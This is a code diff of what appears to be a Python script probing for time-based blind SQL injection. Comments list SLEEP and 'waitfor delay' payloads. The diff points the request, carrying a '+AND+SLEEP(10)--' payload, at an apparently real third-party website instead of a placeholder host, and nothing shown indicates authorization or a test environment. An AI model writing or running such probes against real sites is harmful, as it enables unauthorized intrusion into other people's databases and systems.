@@ -10,8 +10,10 @@ import requests
 #  '+AND+(SELECT+9950+FROM+(SELECT(SLEEP(10)))obCp)--+
 #  '; waitfor delay '0:0:3' --
 
-payload = ""
-url = "https://example.com/test.php?id=5%s" % payload
+# http://www.gianfrancobattiston.it/index.php?id=1
+
+payload = "+AND+SLEEP(10)--"
+url = "http://www.gianfrancobattiston.it/index.php?id=1%s" % payload
 
 try:
     response = requests.get(url, timeout=10)  # 10 seconds
